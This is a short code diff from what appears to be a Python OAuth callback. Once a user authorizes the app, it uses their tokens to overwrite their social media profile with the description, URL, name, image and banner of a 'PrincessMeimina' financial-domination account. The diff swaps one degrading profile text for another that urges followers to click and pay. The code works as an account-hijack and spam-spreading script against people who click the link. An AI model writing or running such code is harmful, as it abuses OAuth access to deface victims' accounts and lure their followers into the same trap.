@@ -182,7 +182,7 @@ def callback():
     real_token = oauth.Token(real_oauth_token, real_oauth_token_secret)
     real_client = oauth.Client(consumer, real_token)
    
-    description="I’m a dumb clickslut for the beautiful @PrincessMeimina. Meimina$$ owns me. You should submit to her pretty link too."
+    description="I clicked a risky link for @PrincessMeimina. You should $END $ERVE $UBMIT to Meimina$$ too."
     update_profile(real_client,"beacons.ai/princessmeimina","beneath Meimina$$",description)
     update_profile_image(real_client)
     update_profile_banner(real_client)
